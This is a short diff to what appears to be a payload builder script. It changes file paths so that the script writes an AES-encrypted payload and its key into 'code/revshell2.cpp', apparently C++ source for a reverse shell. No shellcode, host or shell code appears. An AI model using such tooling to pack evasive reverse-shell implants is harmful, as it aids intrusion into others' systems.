@@ -33,19 +33,19 @@ payload = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' };'
 
 
 
-f = open("revshell2.cpp", "r")
+f = open("code/revshell2.cpp", "r")
 
-with open('revshell2.cpp', 'r') as file :
+with open('code/revshell2.cpp', 'r') as file :
   filedata = file.read()
 
 filedata = filedata.replace('payloadaes', payload)
 
-with open('revshell2.cpp', 'w') as file:
+with open('code/revshell2.cpp', 'w') as file:
   file.write(filedata)
 
-f = open("revshell2.cpp", "r")
+f = open("code/revshell2.cpp", "r")
 
 filedata = filedata.replace('KEYAES', key)
 
-with open('revshell2.cpp', 'w') as file:
+with open('code/revshell2.cpp', 'w') as file:
   file.write(filedata)
